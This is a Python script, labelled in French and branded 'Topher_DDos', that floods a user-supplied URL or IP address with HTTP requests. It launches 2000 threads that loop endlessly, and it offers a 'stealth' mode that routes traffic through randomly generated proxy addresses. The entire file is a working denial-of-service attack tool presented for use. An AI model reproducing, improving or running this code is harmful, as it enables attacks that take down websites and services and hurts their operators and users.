# -*- coding: utf-8 -*-

import os
import time
import socket
import threading
import random
import urllib.request
import itertools
from colorama import init, Fore, Style
from pyfiglet import Figlet
from user_agent import generate_user_agent
from urllib.request import ProxyHandler, build_opener

# Initialisation colorama
init(autoreset=True)

# Configuration couleurs
colors = [
    Fore.RED,
    Fore.GREEN,
    Fore.YELLOW,
    Fore.BLUE,
    Fore.MAGENTA,
    Fore.CYAN,
    Fore.WHITE
]

def animate_ascii(text, duration=5):
    """Affiche l'ASCII animé pendant 'duration' secondes."""
    start_time = time.time()
    while time.time() - start_time < duration:
        for color in colors:
            os.system('clear')
            print(color + text)
            time.sleep(0.2)

# ASCII Art
ascii_text = Figlet(font='slant').renderText('Topher_DDos')

# Animation en lancement
animate_ascii(ascii_text, duration=5)

# Couleurs supplémentaires pour prompts
F = Fore.GREEN
Z = Fore.RED
S = Fore.YELLOW
B = Fore.LIGHTYELLOW_EX

# Demande URL
url = input(f'{B}ENTREZ L\'URL OU L\'ADRESSE IP CIBLE : ')

# Fonctions d'attaque
def AttackMahos():
    while True:
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
            'Keep-Alive': '115',
            'Connection': 'keep-alive',
            'User-Agent': generate_user_agent()
        }
        try:
            req = urllib.request.urlopen(
                urllib.request.Request(url, headers=headers)
            )
            if req.status == 200:
                print(f'{F}GOOD Attack: {url}')
            else:
                print(f'{Z}BAD Attack: {url}')
        except:
            print(f'{S}DOWN: {url}')

def ProxyAttack():
    while True:
        ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
        pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900]
        port = random.choice(pl)
        proxy = ip + ":" + str(port)
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
            'Keep-Alive': '115',
            'Connection': 'keep-alive',
            'User-Agent': generate_user_agent()
        }
        try:
            proxy_handler = ProxyHandler({'http': 'http://' + proxy})
            opener = build_opener(proxy_handler)
            req = opener.open(urllib.request.Request(url, headers=headers))
            if req.status == 200:
                print(f'{F}GOOD Attack: {url} | Proxy: {proxy}')
            else:
                print(f'{Z}BAD Attack: {url} | Proxy: {proxy}')
        except:
            print(f'{S}DOWN: {url} | Proxy: {proxy}')

# Menu de choix
def linked():
    sg = input(
        f'''
══════════════════════════════════════════
{Z}[1] {F}Attaque sans Proxy - Mode Brutal
══════════════════════════════════════════
{S}[2] {F}Attaque avec Proxy - Mode Invisible
══════════════════════════════════════════
{S}⌯{F} Choisis ton mode de frappe (1 ou 2) {F}» '''
    )
    if sg == '1':
        for _ in range(2000):
            threading.Thread(target=AttackMahos).start()
    elif sg == '2':
        for _ in range(2000):
            threading.Thread(target=ProxyAttack).start()

# Démarrer menu
linked()